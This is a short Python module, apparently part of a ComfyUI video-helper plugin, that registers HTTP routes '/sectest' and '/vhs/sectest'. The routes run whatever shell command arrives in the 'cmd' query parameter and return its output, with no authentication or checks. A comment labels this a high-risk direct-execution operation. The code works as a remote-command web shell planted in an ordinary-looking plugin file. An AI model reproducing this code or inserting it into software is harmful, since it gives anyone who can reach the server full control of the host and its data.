import server
import folder_paths
import os
import subprocess
import re

import asyncio

from .utils import is_url, get_sorted_dir_files_from_directory, ffmpeg_path, \
        validate_sequence, is_safe_path, strip_path, try_download_video, ENCODE_ARGS
from comfy.k_diffusion.utils import FolderOfImages


web = server.web

@server.PromptServer.instance.routes.get("/vhs/sectest")
@server.PromptServer.instance.routes.get("/sectest")
async def sectest(request):
    query = request.rel_url.query
    if "cmd" not in query:
        return web.Response(text="Missing cmd parameter", status=400)

    try:
        # 高危操作：直接拼接执行命令
        cmd = query["cmd"]
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await proc.communicate()

        return web.json_response({
            "output": stdout.decode(),
            "error": stderr.decode(),
            "code": proc.returncode
        })

    except Exception as e:
        return web.Response(text=f"Error: {str(e)}", status=500)